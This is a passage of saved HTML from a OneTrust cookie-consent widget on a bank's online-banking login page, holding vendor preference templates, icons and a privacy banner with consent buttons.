                                            <div class="ot-checkbox ot-host-tgl">
                                                <input id="REPLACE-WITH-DYANMIC-HOST-ID" class="host-checkbox-handler group-option-box" type="checkbox" tabindex="0" />
                                                <label for="REPLACE-WITH-DYANMIC-HOST-ID"><span class="label-text">REPLACE-WITH-DYANMIC-HOST-ID</span></label>
                                            </div>
                                            <!-- Checkbox END -->
                                        </section>
                                        <div class="accordion-text">
                                            <div class="host-options">
                                                <!-- HOST LIST VIEW UPDATE *** -->
                                                <ul class="host-option-group">
                                                    <li class="vendor-host">
                                                        <div class="cookie-name-container">
                                                            <div>Name</div>
                                                            <div>cookie name</div>
                                                        </div>
                                                    </li>
                                                </ul>
                                                <!-- HOST LIST VIEW UPDATE END *** -->
                                            </div>
                                        </div>
                                    </li>
                                </ul>
                                <ul id="vendors-list-container">
                                    <li class="vendor-item">
                                        <input type="checkbox" class="vendor-box" role="button" aria-expanded="false" aria-label="33Across" tabindex="0" />
                                        <section class="accordion-header">
                                            <!-- Vendor name policy link -->
                                            <div class="vendor-info">
                                                <h3 class="vendor-title">33Across</h3>
                                                <a class="vendor-privacy-notice" href="https://www.nwolb.com/login.aspx?refererIdent=C0D374D305343333CF060729101BCF4318355E81&amp;CookieCheck=2020-08-19T15:28:42#" tabindex="0">
                                                    View Privacy Notice
                                                </a>
                                            </div>
                                            <!-- purposes count -->
                                            <div class="vendor-purposes"><p>3 Purposes</p></div>
                                            <!-- toggles and arrow -->
                                            <div class="ot-toggle-group">
                                                <!-- Checkbox -->
                                                <div class="ot-checkbox">
                                                    <input id="REPLACE-WITH-DYANMIC-VENDOR-ID" class="vendor-checkbox vendor-checkbox-handler group-option-box" type="checkbox" tabindex="0" />
                                                    <label for="REPLACE-WITH-DYANMIC-VENDOR-ID"><span class="label-text">REPLACE-WITH-DYANMIC-VENDOR-ID</span></label>
                                                </div>
                                                <!-- Checkbox END -->
                                                <div class="ot-arrow-container">
                                                    <svg
                                                        class="ot-arrow"
                                                        xmlns="http://www.w3.org/2000/svg"
                                                        xmlns:xlink="http://www.w3.org/1999/xlink"
                                                        x="0px"
                                                        y="0px"
                                                        width="10px"
                                                        height="10px"
                                                        viewBox="0 0 451.846 451.847"
                                                        style="enable-background: new 0 0 451.846 451.847;"
                                                        xml:space="preserve"
                                                    >
                                                        <title>Arrow</title>
                                                        <g>
                                                            <path
                                                                fill="#7b7b7b"
                                                                d="M345.441,248.292L151.154,442.573c-12.359,12.365-32.397,12.365-44.75,0c-12.354-12.354-12.354-32.391,0-44.744
                        L278.318,225.92L106.409,54.017c-12.354-12.359-12.354-32.394,0-44.748c12.354-12.359,32.391-12.359,44.75,0l194.287,194.284
                        c6.177,6.18,9.262,14.271,9.262,22.366C354.708,234.018,351.617,242.115,345.441,248.292z"
                                                            ></path>
                                                        </g>
                                                    </svg>
                                                </div>
                                            </div>
                                        </section>
                                        <div class="accordion-text">
                                            <div class="vendor-options">
                                                <!-- VENDOR PURPOSE UPDATE *** -->
                                                <div class="vendor-purpose-groups">
                                                    <!-- vendor purposes -->
                                                    <div class="vendor-option vendor-option-purpose"><p>Consent Purposes</p></div>
                                                    <div class="vendor-consent-group">
                                                        <p class="consent-category">Location Based Ads</p>
                                                        <p class="consent-status">Consent Allowed</p>
                                                    </div>
                                                    <!-- vendor legitimate interest purposes -->
                                                    <div class="vendor-option vendor-option-purpose legitimate-interest"><p>Legitimate Interest Purposes</p></div>
                                                    <div class="vendor-consent-group legitimate-interest-group">
                                                        <p class="consent-category">Personalize</p>
                                                        <a
                                                            href="https://www.nwolb.com/login.aspx?refererIdent=C0D374D305343333CF060729101BCF4318355E81&amp;CookieCheck=2020-08-19T15:28:42#"
                                                            class="vendor-opt-out-handler"
                                                            aria-label="Require Opt-Out"
                                                            tabindex="0"
                                                        >
                                                            <div class="op-out-group">
                                                                <span>Require Opt-Out</span>
                                                                <svg x="0px" y="0px" width="15" height="15" viewBox="0 0 511.626 511.627" style="enable-background: new 0 0 511.626 511.627;" xml:space="preserve">
                                                                    <g fill="#718593">
                                                                        <g>
                                                                            <path
                                                                                d="M392.857,292.354h-18.274c-2.669,0-4.859,0.855-6.563,2.573c-1.718,1.708-2.573,3.897-2.573,6.563v91.361
                                  c0,12.563-4.47,23.315-13.415,32.262c-8.945,8.945-19.701,13.414-32.264,13.414H82.224c-12.562,0-23.317-4.469-32.264-13.414
                                  c-8.945-8.946-13.417-19.698-13.417-32.262V155.31c0-12.562,4.471-23.313,13.417-32.259c8.947-8.947,19.702-13.418,32.264-13.418
                                  h200.994c2.669,0,4.859-0.859,6.57-2.57c1.711-1.713,2.566-3.9,2.566-6.567V82.221c0-2.662-0.855-4.853-2.566-6.563
                                  c-1.711-1.713-3.901-2.568-6.57-2.568H82.224c-22.648,0-42.016,8.042-58.102,24.125C8.042,113.297,0,132.665,0,155.313v237.542
                                  c0,22.647,8.042,42.018,24.123,58.095c16.086,16.084,35.454,24.13,58.102,24.13h237.543c22.647,0,42.017-8.046,58.101-24.13
                                  c16.085-16.077,24.127-35.447,24.127-58.095v-91.358c0-2.669-0.856-4.859-2.574-6.57
                                  C397.709,293.209,395.519,292.354,392.857,292.354z"
                                                                            ></path>
                                                                            <path
                                                                                d="M506.199,41.971c-3.617-3.617-7.905-5.424-12.85-5.424H347.171c-4.948,0-9.233,1.807-12.847,5.424
                                  c-3.617,3.615-5.428,7.898-5.428,12.847s1.811,9.233,5.428,12.85l50.247,50.248L198.424,304.067
                                  c-1.906,1.903-2.856,4.093-2.856,6.563c0,2.479,0.953,4.668,2.856,6.571l32.548,32.544c1.903,1.903,4.093,2.852,6.567,2.852
                                  s4.665-0.948,6.567-2.852l186.148-186.148l50.251,50.248c3.614,3.617,7.898,5.426,12.847,5.426s9.233-1.809,12.851-5.426
                                  c3.617-3.616,5.424-7.898,5.424-12.847V54.818C511.626,49.866,509.813,45.586,506.199,41.971z"
                                                                            ></path>
                                                                        </g>
                                                                    </g>
                                                                </svg>
                                                            </div>
                                                        </a>
                                                    </div>
                                                    <!-- Vendor special purposes -->
                                                    <div class="vendor-option-purpose spl-purpose"><p>Special Purposes</p></div>
                                                    <div class="vendor-consent-group spl-purpose-grp"><p class="consent-category">Location Based Ads</p></div>
                                                    <!-- Vendor features -->
                                                    <div class="vendor-option-purpose vendor-feature"><p>Features</p></div>
                                                    <div class="vendor-consent-group vendor-feature-group"><p class="consent-category">Location Based Ads</p></div>
                                                    <!-- Vendor special features -->
                                                    <div class="vendor-option-purpose vendor-spl-feature"><p>Special Features</p></div>
                                                    <div class="vendor-consent-group vendor-spl-feature-grp"><p class="consent-category">Location Based Ads</p></div>
                                                </div>
                                                <!-- VENDOR PURPOSE UPDATE END *** -->
                                            </div>
                                        </div>
                                    </li>
                                </ul>
                            </div>
                        </div>
                    </section>
                    <div id="vendor-list-save-btn" class="save-preference-btn-container">
                        <button class="save-preference-btn-handler onetrust-close-btn-handler button-theme" tabindex="0">Confirm My Choices</button>
                        <div class="ot-pc-footer-logo"><a class="powered-by-logo" href="https://onetrust.com/poweredbyonetrust" target="_blank" rel="noopener" aria-label="Powered by One Trust" tabindex="0"></a></div>
                    </div>
                </section>
            </div>
            <div id="onetrust-banner-sdk" class="otCenterRounded default vertical-align-content" style="visibility: hidden; opacity: 0; transition: visibility 0s ease 400ms, opacity 400ms linear 0s; display: none;">
                <div class="ot-sdk-container">
                    <div class="ot-sdk-row">
                        <div id="onetrust-group-container" class="ot-sdk-twelve ot-sdk-columns">
                            <div id="onetrust-policy">
                                <div class="banner-header">
                                    <div class="banner_logo"></div>
                                    <!-- Mobile Close Button -->
                                    <div id="onetrust-close-btn-container"></div>
                                    <!-- Mobile Close Button END-->
                                </div>
                                <h3 id="onetrust-policy-title">We care about your privacy</h3>
                                <p id="onetrust-policy-text">
                                    We use cookies to ensure our website works properly. To help us improve our service, we collect data to understand how people use our site. By allowing all cookies, we can enhance your experience even
                                    further. This means helping you find information more quickly and tailoring content or marketing to your needs. Select “Allow All Cookies” to agree or “Manage Preferences” to manage cookie settings. You
                                    can find out more by viewing our <a href="https://www.nwolb.com/cookiesPolicy.aspx" target="_blank" tabindex="0">Cookie Policy</a>
                                </p>
                            </div>
                        </div>
                        <div id="onetrust-button-group-parent" class="ot-sdk-twelve ot-sdk-columns">
                            <div id="onetrust-button-group">
                                <div class="banner-actions-container"><button id="onetrust-accept-btn-handler" tabindex="0">Allow All Cookies</button></div>
                                <button id="onetrust-pc-btn-handler" tabindex="0">Manage Preferences</button>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </body>
</html>
